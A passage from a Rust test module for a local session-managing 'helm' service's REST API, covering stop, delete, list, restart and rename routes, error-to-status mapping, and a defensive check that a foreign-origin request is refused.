                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/stop")
            .header("host", "127.0.0.1:7433")
            .body(axum::body::Body::empty())
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::OK);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        let value: serde_json::Value = serde_json::from_slice(&body).unwrap();
        assert_eq!(value, serde_json::json!({}));

        peer.await.unwrap();
    }

    /// Stopping an unknown id must surface as a 404 carrying the
    /// helm's OWN message, without the request ever reaching a supervisor.
    ///
    /// This contract INVERTED with PLAN_M6.md item 5, and the inversion is
    /// the point of keeping the test. Before owner routing, an unknown id
    /// was the supervisor's question to answer, and this test pinned the
    /// verbatim passthrough of its 404. Now the helm resolves a session's
    /// owning host in its merged view first, so an id nobody owns has no
    /// host to ask — answering it locally is not an optimization but the
    /// only honest thing available, since "which supervisor would you even
    /// forward this to" has no answer.
    ///
    /// Both halves are asserted: the status and body a caller sees, and —
    /// through [`silent_supervisor`] — that the connected host was not
    /// asked. Without the second half a helm that forwarded the request AND
    /// answered locally would pass.
    #[tokio::test]
    async fn stop_session_unknown_id_returns_404_with_supervisor_message() {
        use tower::ServiceExt;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(silent_supervisor(peer_side));

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-missing/stop")
            .header("host", "127.0.0.1:7433")
            .body(axum::body::Body::empty())
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::NOT_FOUND);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&body),
            "no such session: sess-missing",
            "the helm's own refusal must name the id it could not place"
        );

        peer.await.unwrap();
    }

    /// `DELETE /api/sessions/{id}` happy path, mirroring the stop test
    /// above: a scripted `SessionDeleted` reply must reach the caller as
    /// 200 with the same empty-object body shape.
    #[tokio::test]
    async fn delete_session_happy_path_returns_200_with_empty_object_body() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use tower::ServiceExt;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::DeleteSession { req_id, session_id } = request else {
                panic!("expected DeleteSession, got {request:?}");
            };
            assert_eq!(session_id, "sess-1");
            writer
                .write_control(&ControlMsg::SessionDeleted { req_id })
                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("DELETE")
            .uri("/api/sessions/sess-1")
            .header("host", "127.0.0.1:7433")
            .body(axum::body::Body::empty())
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::OK);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        let value: serde_json::Value = serde_json::from_slice(&body).unwrap();
        assert_eq!(value, serde_json::json!({}));

        peer.await.unwrap();
    }

    /// Deleting an unknown id must 404 from the helm's own owner lookup,
    /// the delete-side twin of
    /// `stop_session_unknown_id_returns_404_with_supervisor_message` — see
    /// that test's docs for why this contract inverted with M6's routing,
    /// and why the silent supervisor is half the assertion.
    #[tokio::test]
    async fn delete_session_unknown_id_returns_404_with_supervisor_message() {
        use tower::ServiceExt;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(silent_supervisor(peer_side));

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("DELETE")
            .uri("/api/sessions/sess-missing")
            .header("host", "127.0.0.1:7433")
            .body(axum::body::Body::empty())
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::NOT_FOUND);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&body),
            "no such session: sess-missing",
            "the helm's own refusal must name the id it could not place"
        );

        peer.await.unwrap();
    }

    /// `GET /api/sessions`'s JSON shape, which the UI decodes and which
    /// PLAN_M6.md item 5 extended without breaking.
    ///
    /// Two halves, both load-bearing for the UI PRs that follow. The M2
    /// envelope (`sessions`/`total`/`truncated`) is still there under the
    /// same names, so the list UI in this tree keeps decoding it unchanged;
    /// and each row now carries `host`/`host_name`/`stale` as ADDITIVE
    /// siblings of the session's own fields, never nested under a wrapper —
    /// which is the whole reason `SessionRow` flattens `SessionInfo`
    /// instead of embedding it.
    ///
    /// Asserted on raw JSON rather than a decoded type, because the UI
    /// decodes JSON: a serialization change that a round trip through the
    /// same Rust types would hide is exactly what would break the list in
    /// the browser.
    #[tokio::test]
    async fn list_sessions_returns_the_merged_listing_object_shape() {
        let harness =
            rest_harness::helm_listing(vec![rest_harness::session("sess-1", 1_700_000_000)]).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("GET")
            .uri("/api/sessions")
            .header("host", "127.0.0.1:7433")
            .body(axum::body::Body::empty())
            .unwrap();

        let response = tower::ServiceExt::oneshot(app, request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::OK);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        let value: serde_json::Value = serde_json::from_slice(&body).unwrap();
        assert_eq!(value["total"], 1, "total counts the merged view");
        assert_eq!(
            value["truncated"], false,
            "one page held everything, so there is no next page"
        );
        assert_eq!(value["next_cursor"], serde_json::Value::Null);

        let row = &value["sessions"][0];
        assert_eq!(row["id"], "sess-1");
        assert_eq!(
            row["title"], "sess-1",
            "the session's own fields stay at the row's top level"
        );
        assert_eq!(
            row["host"],
            rest_harness::local_id(&harness.store).await,
            "every row names the host it lives on"
        );
        assert_eq!(
            row["host_name"], "this machine",
            "the reserved local row is described, never addressed"
        );
        assert_eq!(
            row["stale"], false,
            "a connected host's rows are live knowledge"
        );
    }

    /// `GET /api/sessions/{id}` — the session-detail route a session view
    /// actually fetches — must pass a NON-EMPTY `tabs` list through
    /// intact. `farhelm-proto`'s own tests already pin `SessionInfo`'s
    /// JSON shape exhaustively (order, nesting, everything); what the helm
    /// still owes is exactly one HTTP-boundary check that THIS route does
    /// not drop or mangle the field on its way from the supervisor's
    /// `ListSessions` reply to the JSON body a browser decodes — this
    /// replaces an earlier version of the same check aimed at the bulk
    /// LISTING route, which no session view reads tabs from.
    #[tokio::test]
    async fn get_session_passes_a_non_empty_tabs_list_through() {
        let harness = rest_harness::helm_listing(vec![farhelm_proto::SessionInfo {
            tabs: vec![
                farhelm_proto::TabInfo { id: "tab-1".into() },
                farhelm_proto::TabInfo { id: "tab-2".into() },
            ],
            ..rest_harness::session("sess-1", 1_700_000_000)
        }])
        .await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("GET")
            .uri("/api/sessions/sess-1")
            .header("host", "127.0.0.1:7433")
            .body(axum::body::Body::empty())
            .unwrap();

        let response = tower::ServiceExt::oneshot(app, request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::OK);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        let value: serde_json::Value = serde_json::from_slice(&body).unwrap();
        assert_eq!(
            value["tabs"],
            serde_json::json!([{"id": "tab-1"}, {"id": "tab-2"}])
        );
        assert_eq!(
            value["stale"], false,
            "a connected host's detail is live, and says so"
        );
        assert_eq!(
            value["host"],
            rest_harness::local_id(&harness.store).await,
            "the detail route carries the same host fields a list row does"
        );
    }

    /// The helm is a passthrough for classification, and PLAN_M3.md item 2
    /// is the first change that makes that claim testable with something
    /// the helm could plausibly get wrong: `interrupted` is a status
    /// variant no earlier milestone had, and the stop annotation is a
    /// field nothing used to populate. Neither is invented, renamed, or
    /// dropped here — the supervisor is authoritative (SPEC.md), and this
    /// pins that the JSON the browser receives says exactly what the
    /// supervisor said.
    ///
    /// Asserted on the raw JSON rather than a decoded `SessionInfo`,
    /// because the UI decodes JSON, not proto types: a serialization
    /// change that a round trip through the same Rust types would hide is
    /// precisely what would break the badge in the browser.
    ///
    /// As of PLAN_M6.md item 5 the claim is stronger than it was: these
    /// rows now reach the browser by way of helm.db's session cache, so
    /// they survive a serialize/store/deserialize round trip on the way.
    /// A status variant or annotation field that failed to persist would
    /// fail here too, which is exactly the coverage a durable cache of
    /// supervisor-authored data needs.
    #[tokio::test]
    async fn list_sessions_passes_interrupted_status_and_stop_annotation_through() {
        let session = |id: &str, status, annotation: Option<&str>| farhelm_proto::SessionInfo {
            status,
            annotation: annotation.map(str::to_string),
            // `created_at` is shared, so the merged order falls to the id
            // tiebreak — which is what fixes "lost" ahead of "stopped"
            // below rather than leaving the two positions to chance.
            ..rest_harness::session(id, 1_700_000_000)
        };
        let harness = rest_harness::helm_listing(vec![
            session("lost", farhelm_proto::SessionStatus::Interrupted, None),
            session(
                "stopped",
                farhelm_proto::SessionStatus::Exited { exit_code: Some(0) },
                Some(farhelm_proto::STOP_ANNOTATION),
            ),
        ])
        .await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("GET")
            .uri("/api/sessions")
            .header("host", "127.0.0.1:7433")
            .body(axum::body::Body::empty())
            .unwrap();

        let response = tower::ServiceExt::oneshot(app, request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::OK);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        let value: serde_json::Value = serde_json::from_slice(&body).unwrap();
        assert_eq!(value["sessions"][0]["status"]["state"], "interrupted");
        assert_eq!(value["sessions"][0]["annotation"], serde_json::Value::Null);
        assert_eq!(value["sessions"][1]["status"]["state"], "exited");
        assert_eq!(value["sessions"][1]["annotation"], "stopped by user");
    }

    /// The DNS-rebinding origin guard is route-agnostic middleware, and the
    /// Playwright suite (`terminal.spec.ts`, "requests from a foreign
    /// origin are refused") already proves it holds through the real
    /// stack. What that suite does NOT cover is this PR's own change: that
    /// the guard sits in front of the new mutating routes too, not just
    /// `GET /api/sessions`, and that a refused request never reaches the
    /// supervisor at all. A loopback `Host` (same-origin by that half of
    /// the check) paired with a foreign `Origin` isolates exactly the
    /// half the browser itself supplies from the requesting page's origin
    /// — same setup as `foreign_or_missing_authorities_are_refused`
    /// above, aimed at the stop route instead of the pure function.
    ///
    /// Proof that no frame reached the supervisor comes from EOF, not a
    /// timeout: `oneshot` consumes the router (and with it the only
    /// remaining `Arc<SupervisorClient>`) once the response is produced, so
    /// the transport closes right after — the scripted peer reading a clean
    /// `Ok(None)` at that point means nothing but the handshake was ever
    /// written to it. A frame arriving instead (a bypassed guard) would read
    /// as `Ok(Some(_))`, which is what this actually distinguishes.
    #[tokio::test]
    async fn foreign_origin_is_refused_on_the_stop_route() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake};
        use tower::ServiceExt;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            // A bounded silence, not an EOF: the harness keeps this
            // connection open for the whole test (see `rest_harness`), so
            // "nothing reached the supervisor" is only observable as
            // nothing ARRIVING. The window is generous because a false
            // pass needs the frame to be merely late, and a stop that the
            // middleware failed to refuse would be sent immediately.
            let leaked = tokio::time::timeout(Duration::from_secs(2), reader.read_frame()).await;
            assert!(
                leaked.is_err(),
                "stop request must never reach the supervisor for a foreign origin, but one \
                 arrived: {leaked:?}"
            );
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/stop")
            .header("host", "127.0.0.1:7433")
            .header("origin", "http://evil.example")
            .body(axum::body::Body::empty())
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::FORBIDDEN);

        peer.await.unwrap();
    }

    /// `http_error`'s status mapping, pinned through the real handler and
    /// middleware stack rather than by calling `http_error` directly: what
    /// actually matters is that a `ControlMsg::Error`'s `kind` survives
    /// `SupervisorClient::request`'s downcast and reaches the HTTP status,
    /// not just that the mapping function has the right match arms.
    ///
    /// `InvalidRequest` is exercised here (400) rather than `NotFound`
    /// (404): both go through the identical downcast path in `http_error`,
    /// and the supervisor-side classification for a bad cwd — the
    /// realistic `InvalidRequest` case — is itself pinned end-to-end
    /// against a real supervisor in `farhelm/tests/e2e.rs`
    /// (`create_in_missing_directory_errors`). This test's job is narrower
    /// and complementary: prove the *client-and-HTTP* half of the chain
    /// (scripted `Error` reply in, status code out) without needing a real
    /// supervisor, tmux, or filesystem precondition to produce one.
    #[tokio::test]
    async fn create_session_error_reply_maps_to_bad_request_status() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, ErrorKind, Frame};
        use tower::ServiceExt;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::CreateSession { req_id, .. } = request else {
                panic!("expected CreateSession, got {request:?}");
            };
            writer
                .write_frame(&Frame::control(&ControlMsg::Error {
                    req_id,
                    message: "working directory does not exist: /nope".into(),
                    kind: ErrorKind::InvalidRequest,
                }))
                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions")
            .header("host", "127.0.0.1:7433")
            .header("content-type", "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({"cwd": "/nope", "invocation": "some-agent"}).to_string(),
            ))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::BAD_REQUEST);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert!(
            String::from_utf8_lossy(&body).contains("does not exist"),
            "body must still carry the supervisor's concrete message"
        );

        peer.await.unwrap();
    }

    /// `http_error`'s downcast must find a [`SupervisorError`] under a
    /// `.context(...)` layer, not just at the root — an intermediate
    /// caller (`connect_supervisor`, say) is free to add its own context
    /// on the way out, and the status mapping must survive that. Spec:
    /// `NotFound` → 404 regardless of how many context layers sit on top.
    #[test]
    fn http_error_maps_context_wrapped_not_found_to_404() {
        let err = anyhow::Error::new(SupervisorError {
            kind: farhelm_proto::ErrorKind::NotFound,
            message: "no such session: s1".to_string(),
        })
        .context("attaching to terminal");
        let response = super::http_error(err);
        assert_eq!(response.status(), axum::http::StatusCode::NOT_FOUND);
    }

    /// Spec: a `SupervisorError` explicitly carrying `Internal` maps to
    /// 500 — the honest default for a failure the caller could not have
    /// avoided by sending a different request, distinct from `NotFound`/
    /// `InvalidRequest` mapping to their own codes above.
    #[test]
    fn http_error_maps_internal_supervisor_error_to_500() {
        let err = anyhow::Error::new(SupervisorError {
            kind: farhelm_proto::ErrorKind::Internal,
            message: "tmux hiccup".to_string(),
        });
        let response = super::http_error(err);
        assert_eq!(
            response.status(),
            axum::http::StatusCode::INTERNAL_SERVER_ERROR
        );
    }

    /// PLAN_M3.md item 6: an intent key reused with a different
    /// fingerprint maps to 409, the standard HTTP reading of "this
    /// identifier already means something else" (see `ErrorKind::Conflict`'s
    /// own doc comment in farhelm-proto for the full rationale, and this
    /// function's own docstring for the mapping table).
    #[test]
    fn http_error_maps_conflict_supervisor_error_to_409() {
        let err = anyhow::Error::new(SupervisorError {
            kind: farhelm_proto::ErrorKind::Conflict,
            message: "intent key already used with a different request".to_string(),
        });
        let response = super::http_error(err);
        assert_eq!(response.status(), axum::http::StatusCode::CONFLICT);
    }

    /// Spec: an error chain with no `SupervisorError` anywhere in it — a
    /// bare `anyhow` error from a layer that never classified anything —
    /// must default to 500 rather than panicking or silently guessing a
    /// more specific status.
    #[test]
    fn http_error_maps_unclassified_error_to_500() {
        let err = anyhow::anyhow!("supervisor connection closed");
        let response = super::http_error(err);
        assert_eq!(
            response.status(),
            axum::http::StatusCode::INTERNAL_SERVER_ERROR
        );
    }

    /// `POST /api/sessions/{id}/restart` end to end (PLAN_M3.md item 9):
    /// the body's `mode` and `stop_if_running` reach the supervisor
    /// unaltered, and the success body is the session's own recomputed
    /// `SessionInfo` — including the freshly computed `restart_offer` a
    /// caller re-renders its row from without listing again.
    ///
    /// Both body fields are asserted at the WIRE, not merely accepted by
    /// the handler: `stop_if_running` is the user's consent to kill a
    /// running agent and `mode` is the choice the supervisor validates
    /// against the current offer, so a route that dropped or defaulted
    /// either would be a silent safety regression rather than a visible
    /// failure.
    #[tokio::test]
    async fn restart_session_passes_mode_and_consent_through_and_returns_the_session() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use tower::ServiceExt;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::RestartSession {
                req_id,
                session_id,
                mode,
                stop_if_running,
            } = request
            else {
                panic!("expected RestartSession, got {request:?}");
            };
            assert_eq!(session_id, "sess-1");
            assert_eq!(mode, farhelm_proto::RestartMode::Resume);
            assert!(
                stop_if_running,
                "the user's consent to stop a live agent must reach the supervisor"
            );
            writer
                .write_control(&ControlMsg::SessionRestarted {
                    req_id,
                    session: farhelm_proto::SessionInfo {
                        id: "sess-1".into(),
                        title: "t".into(),
                        created_at: 1_700_000_000,
                        cwd: "/some/dir".into(),
                        invocation: "some-agent".into(),
                        status: farhelm_proto::SessionStatus::Unknown,
                        annotation: None,
                        restart_offer: farhelm_proto::RestartOffer::Resume,
                        tabs: Vec::new(),
                    },
                })
                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();
        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/restart")
            .header("host", "127.0.0.1:7433")
            .header("content-type", "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({ "mode": "resume", "stop_if_running": true }).to_string(),
            ))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::OK);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        let value: serde_json::Value = serde_json::from_slice(&body).unwrap();
        assert_eq!(value["id"], "sess-1");
        assert_eq!(
            value["restart_offer"], "resume",
            "the reply carries the offer the session has NOW, which is what a client re-renders"
        );

        peer.await.unwrap();
    }

    /// A stale-offer refusal must reach the browser as a 409 carrying the
    /// supervisor's own prose — that message names the CURRENT offer, and
    /// re-presenting it is the client's prescribed response (the wire
    /// vocabulary's staleness contract). A route that flattened it to a
    /// generic 500 would leave the UI with nothing to say.
    #[tokio::test]
    async fn restart_session_conflict_reaches_the_caller_as_409_with_its_message() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, ErrorKind};
        use tower::ServiceExt;

        const SENTINEL: &str = "SENTINEL-restart-4b1e: the offer is now resume";

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::RestartSession { req_id, .. } = request else {
                panic!("expected RestartSession, got {request:?}");
            };
            writer
                .write_control(&ControlMsg::Error {
                    req_id,
                    message: SENTINEL.to_string(),
                    kind: ErrorKind::Conflict,
                })
                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();
        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/restart")
            .header("host", "127.0.0.1:7433")
            .header("content-type", "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({ "mode": "fresh" }).to_string(),
            ))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::CONFLICT);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert_eq!(String::from_utf8_lossy(&body).trim(), SENTINEL);

        peer.await.unwrap();
    }

    /// `POST /api/sessions/{id}/rename` end to end (PLAN_M5.md item 4), for
    /// every shape a title can take: an ordinary title, the empty string
    /// (an explicit empty title is a legal rename, symmetric with an
    /// explicit empty title on create — PLAN_M5.md item 3), leading/
    /// trailing whitespace, and embedded control characters (the very
    /// thing the supervisor's own validation refuses, so this helm-level
    /// hop must not pre-filter or normalize it away before the refusal can
    /// even run). One route, four shapes, because the property under
    /// test — "no trimming, no validation, no rewriting" — is the same
    /// claim for each and a shared body keeps the cases from drifting
    /// into subtly different assertions.
    ///
    /// The success body is checked as a FULL `SessionInfo`, field for
    /// field against the scripted reply, not just `id`/`title`: a route
    /// that echoed a stale or partially-rebuilt session (the bug
    /// `SessionRenamed`'s own docs warn against — see
    /// `ControlMsg::SessionRenamed`) would still pass an id/title-only
    /// check while failing every other field.
    #[tokio::test]
    async fn rename_session_forwards_the_title_verbatim() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, RestartOffer, SessionInfo, SessionStatus, TabInfo};
        use tower::ServiceExt;

        let cases = [
            "an ordinary title",
            "",
            "  leading and trailing spaces  ",
            "bell\u{7}esc\u{1b}nl\ntab\t",
        ];

        for title in cases {
            let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
            let expected_title = title.to_string();
            // Distinctive on every field, not just `title`: a handler
            // that echoed back a stale or default-filled `SessionInfo`
            // must fail the full-struct comparison below even if the
            // title alone looked right.
            let expected_session = SessionInfo {
                id: "sess-1".into(),
                title: expected_title.clone(),
                created_at: 1_700_000_000,
                cwd: "/distinctive/dir".into(),
                invocation: "distinctive-agent --flag".into(),
                status: SessionStatus::Alive,
                annotation: None,
                restart_offer: RestartOffer::Resume,
                tabs: vec![TabInfo { id: "tab-1".into() }],
            };
            let reply_session = expected_session.clone();
            let peer = tokio::spawn(async move {
                let (r, w) = tokio::io::split(peer_side);
                let mut reader = FrameReader::new(r);
                let mut writer = FrameWriter::new(w);
                handshake(&mut reader, &mut writer, "supervisor")
                    .await
                    .unwrap();
                let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
                let ControlMsg::RenameSession {
                    req_id, title: got, ..
                } = request
                else {
                    panic!("expected RenameSession, got {request:?}");
                };
                assert_eq!(
                    got, expected_title,
                    "the title must reach the supervisor byte-for-byte unchanged"
                );
                writer
                    .write_control(&ControlMsg::SessionRenamed {
                        req_id,
                        session: reply_session,
                    })
                    .await
                    .unwrap();
            });

            let harness = rest_harness::spliced_helm(client_side).await;
            let app = harness.router();
            let request = axum::http::Request::builder()
                .method("POST")
                .uri("/api/sessions/sess-1/rename")
                .header("host", "127.0.0.1:7433")
                .header("content-type", "application/json")
                .body(axum::body::Body::from(
                    serde_json::json!({ "title": title }).to_string(),
                ))
                .unwrap();

            let response = app.oneshot(request).await.unwrap();
            assert_eq!(
                response.status(),
                axum::http::StatusCode::OK,
                "for title {title:?}"
            );
            let body = axum::body::to_bytes(response.into_body(), usize::MAX)
                .await
                .unwrap();
            let got_session: SessionInfo = serde_json::from_slice(&body).unwrap();
            assert_eq!(
                got_session, expected_session,
                "the success body must be the supervisor's FULL SessionInfo, not a partial \
                 echo, for title {title:?}"
            );

            peer.await.unwrap();
        }
    }

    /// A body whose `title` field is MISSING entirely must be refused
    /// before this route's handler ever runs — 422 from axum 0.8's `Json`
    /// extractor rejecting a body that parses as JSON but fails to
    /// deserialize into `RenameReq` (a missing required field), distinct
    /// from the 400 a body that is not valid JSON at all would get
    /// (`RenameReq`'s own docs name the same distinction) — and
    /// distinctly from a body whose `title` is PRESENT but explicitly
    /// empty, which must reach the supervisor and be accepted (SPEC.md
    /// names control characters, not absence of content, as rename's
    /// refusal — PLAN_M5.md item 3; `rename_session_forwards_the_title_verbatim`
    /// also carries the empty-string case among its shapes). Both halves
    /// live in this one test, rather than as two that could quietly drift
    /// apart, because "missing" and "explicit empty" are exactly the pair
    /// a route that collapsed `Option<String>` handling could confuse.
    #[tokio::test]
    async fn rename_session_missing_title_is_422_but_an_explicit_empty_title_is_accepted() {
        use tower::ServiceExt;

        // Half 1: `title` absent. No frame may reach the supervisor at
        // all — a rejected extractor never calls `rename_session`'s body.
        {
            let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
            let peer = tokio::spawn(async move {
                let (r, w) = tokio::io::split(peer_side);
                let mut reader = farhelm_proto::io::FrameReader::new(r);
                let mut writer = farhelm_proto::io::FrameWriter::new(w);
                farhelm_proto::io::handshake(&mut reader, &mut writer, "supervisor")
                    .await
                    .unwrap();
                reader
            });

            let harness = rest_harness::spliced_helm(client_side).await;
            let app = harness.router();
            let request = axum::http::Request::builder()
                .method("POST")
                .uri("/api/sessions/sess-1/rename")
                .header("host", "127.0.0.1:7433")
                .header("content-type", "application/json")
                .body(axum::body::Body::from(serde_json::json!({}).to_string()))
                .unwrap();

            let response = app.oneshot(request).await.unwrap();
            assert_eq!(
                response.status(),
                axum::http::StatusCode::UNPROCESSABLE_ENTITY,
                "a body missing the required `title` field must be a 422 from the JSON extractor"
            );

            // Dropping `app`/`response` above already dropped this
            // block's only `SupervisorClient` handle, which closes the
            // transport — so the peer seeing EOF proves nothing about
            // whether a frame was sent first; only the SHAPE of what (if
            // anything) arrives does. A still-open connection with
            // nothing to read, or a clean EOF with nothing read, are both
            // consistent with "no frame was ever sent"; an actual frame
            // is the one outcome that is not.
            let mut reader = peer.await.unwrap();
            match tokio::time::timeout(Duration::from_millis(200), reader.read_frame()).await {
                Err(_) | Ok(Ok(None)) => {}
                Ok(Ok(Some(frame))) => panic!(
                    "a rejected extractor must never let a RenameSession reach the \
                     supervisor, but this frame arrived: {frame:?}"
                ),
                Ok(Err(e)) => {
                    panic!("unexpected transport error while checking for a stray frame: {e}")
                }
            }
        }

        // Half 2: `title` present and explicitly empty. Must reach the
        // supervisor (not be treated as if it were absent) and succeed.
        {
            use farhelm_proto::ControlMsg;
            use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};

            let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
            let peer = tokio::spawn(async move {
                let (r, w) = tokio::io::split(peer_side);
                let mut reader = FrameReader::new(r);
                let mut writer = FrameWriter::new(w);
                handshake(&mut reader, &mut writer, "supervisor")
                    .await
                    .unwrap();
                let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
                let ControlMsg::RenameSession { req_id, title, .. } = request else {
                    panic!("expected RenameSession, got {request:?}");
                };
                assert_eq!(
                    title, "",
                    "an explicit empty title must reach the supervisor, not be treated as \
                     though it were absent"
                );
                writer
                    .write_control(&ControlMsg::SessionRenamed {
                        req_id,
                        session: farhelm_proto::SessionInfo {
                            id: "sess-1".into(),
                            title: String::new(),
                            created_at: 1_700_000_000,
                            cwd: "/some/dir".into(),
                            invocation: "some-agent".into(),
                            status: farhelm_proto::SessionStatus::Unknown,
                            annotation: None,
                            restart_offer: farhelm_proto::RestartOffer::default(),
                            tabs: Vec::new(),
                        },
                    })
                    .await
                    .unwrap();
            });

            let harness = rest_harness::spliced_helm(client_side).await;
            let app = harness.router();
            let request = axum::http::Request::builder()
                .method("POST")
                .uri("/api/sessions/sess-1/rename")
                .header("host", "127.0.0.1:7433")
                .header("content-type", "application/json")
                .body(axum::body::Body::from(
                    serde_json::json!({ "title": "" }).to_string(),
                ))
                .unwrap();

            let response = app.oneshot(request).await.unwrap();
            assert_eq!(
                response.status(),
                axum::http::StatusCode::OK,
                "an explicit empty title must be ACCEPTED, distinctly from the missing-field \
                 case in the first half of this test"
            );

            peer.await.unwrap();
        }
    }

    /// Renaming an unknown session must 404 from the helm's own owner
    /// lookup, without reaching a supervisor — the rename-side twin of
    /// `stop_session_unknown_id_returns_404_with_supervisor_message`, whose
    /// docs carry the reasoning.
    #[tokio::test]
    async fn rename_session_unknown_id_returns_404_with_supervisor_message() {
        use tower::ServiceExt;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(silent_supervisor(peer_side));

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();
        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-missing/rename")
            .header("host", "127.0.0.1:7433")
            .header("content-type", "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({ "title": "doesn't matter" }).to_string(),
            ))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
